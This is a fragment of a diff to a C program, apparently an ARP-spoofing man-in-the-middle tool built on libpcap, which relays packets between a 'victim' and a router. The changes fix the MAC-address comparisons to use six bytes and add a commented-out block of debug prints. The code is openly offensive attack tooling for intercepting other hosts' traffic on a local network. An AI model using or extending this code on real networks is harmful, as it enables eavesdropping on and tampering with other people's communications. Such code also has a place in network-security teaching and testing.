@@ -179,8 +179,28 @@ int arp_spoof(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *
 }
 void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
 	printf("Sending response from victim to attacker\n");
-											      
-			      
+	/*								      
+	printf("Sending values:\n");
+	printf("Sender MAC: "); 
+    for(i=0; i<6;i++)
+        printf("%02X:", arp->sha[i]); 
+
+
+    printf("\nSender IP: "); 
+    for(i=0; i<4; i++)
+        printf("%d.", arp->spa[i]);
+
+
+    printf("\nTarget MAC: "); 
+
+    for(i=0; i<6;i++)
+        printf("%02X:", v_mac[i]); 
+
+    printf("\nTarget IP: "); 
+    for(i=0; i<4;i++)
+        printf("%d.", arp->tpa[i]); 
+*/
+	
 	const struct sniff_ethernet *ethernet;
 	ethernet = strip_ethernet(header, packet);
 	struct ether_header *eptr = (struct ether_header *) packet;
@@ -193,10 +213,10 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
                 ntohs(eptr->ether_type),
                 ntohs(eptr->ether_type));
 		printf("Size of r_mac: %lu\n", sizeof(r_mac));
-		if(memcmp(ethernet->ether_dhost, r_mac, sizeof(r_mac)) == 0){
+		if(memcmp(ethernet->ether_dhost, r_mac, 6) == 0){
 			src_mac = v_mac;
 			src_ip = v_ip;
-		}else if(memcmp(ethernet->ether_dhost, v_mac, sizeof(v_mac)) == 0){
+		}else if(memcmp(ethernet->ether_dhost, v_mac, 6) == 0){
 			src_mac = r_mac;
 			src_ip = r_ip;
 		}else{
@@ -224,10 +244,10 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
                 ntohs(eptr->ether_type),
                 ntohs(eptr->ether_type));
 		printf("Size of r_mac: %lu\n", sizeof(r_mac));
-		if(memcmp(ethernet->ether_dhost, r_mac, sizeof(r_mac)) == 0){
+		if(memcmp(ethernet->ether_dhost, r_mac, 6) == 0){
 			src_mac = r_mac;
 			src_ip = r_ip;
-		}else if(memcmp(ethernet->ether_dhost, v_mac, sizeof(v_mac)) == 0){
+		}else if(memcmp(ethernet->ether_dhost, v_mac, 6) == 0){
 			src_mac = v_mac;
 			src_ip = v_ip;
 		}else{
